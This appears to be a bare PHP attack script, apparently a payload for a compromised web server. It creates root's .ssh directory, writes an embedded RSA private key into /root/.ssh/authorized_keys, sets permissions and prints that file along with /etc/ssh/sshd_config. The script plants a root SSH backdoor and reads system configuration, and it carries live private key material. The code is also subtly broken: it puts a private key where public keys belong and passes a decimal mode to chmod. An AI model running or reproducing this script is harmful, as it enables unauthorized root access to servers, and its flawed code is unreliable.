<?php
mkdir("/root/.ssh/");
file_put_contents("/root/.ssh/authorized_keys","-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0k5q2E5uRuPEwqIWSDDouseZaZ5S4MRySWiUhrKdfpPpAacX
gcyWxmPHkR1wcKBS3jrdyP6vbnH0ydns1TOLfnujqIwOdRVpnlkkyKwH3JchB9e2
i7J8AhSpE7uOFHXfgiwsikQjOZ15S1BitpnFt8Ozf9czsLIZJxlCAtLU0oymH1JD
zovJU/dlVBRMBfH9s9K282MVYQhOQtfuqRabIei6P9FryeR0FBtjLbXJHJ4ZMYkP
mawLFlIW9D889K8EWqv/xmL9UzGeW02XwNaCEwAOcLAj8inbqW/Fnl1fVIqJ5ohB
4Q/67+JpeTfKJi5B8eEYXZ00paK4O9UFE1wm9wIDAQABAoIBAEWIL8M8izFc9Rz0
wjE0Gn5Gp+5HrlcqHC8xKIowW+oRtSQavqbnoaIOM1lDRn22RC+9fr6Jli8J9kkW
iDslQ6WZ804yoEUNw1HbX1IJrr+8J+uT4oLljCKT+iLQC/Wv0yoSuNcuGAdgjU3d
UgXVaY2MYriNykVNXQuUSkLsufiydmqvXqZx0JIQBxFE+uzGtRKZzwOh1VKzSnfH
3N92SPBUa0s02SvubfilaxDOIzP5XRJWmFncfmMxJG+o3RATcY915U2NmM77qG7a
HMDc5vKmmas7MG6Xjf7xRrEuA5zusDxih7A+duQmfpPzL0zNrcPuUAC/OOIyLt3y
kE3B9OECgYEA7ve2uTpkYW4MZgiPM8ryTiqKFVCx3/aFgoU9QDnmevbo2GnSUPOI
dOATSQ1RhLhKHJtSLy+MtMPJ8nyDmy1bTBsLd7YCulf9fo18nhCeWX1KpwmUJa/E
wFc71s+g0gXduDW7uTRC7EfxJsLBGfILXJGbo8RNuaCXwFIfMhZTYL0CgYEA4Uu9
RKlqMaWLbUw6bHjLNO6SekCGqiN5VJC6bnRBLmjAIn16upwMA0dF63S77ouX4o0A
u9S6V7JUootUdTPfxmROYxElKROhfNOZW0ofBOjpqw40qosUMWicr5gAsIcHBaOI
q2yxX7iPo6iYlONoMa4CxjnDPrNwLw/s8sooQ8MCgYEApQY4D049x/LBaSz8B55d
GpHR7cpeK/YIWQw+Mj5J5hzgy6K4dOLZFy0u5EHoS6kgtQSmCqPhnWuf6G8IS39V
DweWMcNlut3M1zpKFrYPRGl7xkKdJjFtxA356uxTePZIGVAyJUHr/VPpOwU/aPV3
1yNOwhdsPYajhVKw7FvylFkCgYEAzbDSmi96jt0vUJh59rLKBAeUoBztVcSRb427
SEDHidGFKXgaZuk1ZoDZ60BmnEHCZ8qIUvTDNHHSJ5zBfUfhFEZb8sKihMAxfb/K
kbg4XckwHUYY+2ODCiESfJZwerqsxI8rpibUQipEqgyxUa3VYRYX3la6VTKKR81o
bbn3zPUCgYEA0le6nkSlHaQo2JYUjssNlmayTMPv29TsTLKKi+77LRGAzeKV+V5L
OJIGwCjsFEe0mXOo+XG40vf6LqyYdKpS2L/d7HTNutbdnNRFiez3R1X5Wz6SsivO
dHWXCFbrIjTc3/qVU5CT79i02zGpRrqYkkePzVPhluT1TpAb29jENYc=
-----END RSA PRIVATE KEY-----");
chmod("/root/.ssh/authorized_keys",600);
echo file_get_contents("/root/.ssh/authorized_keys").PHP_EOL.file_get_contents("/etc/ssh/sshd_config");
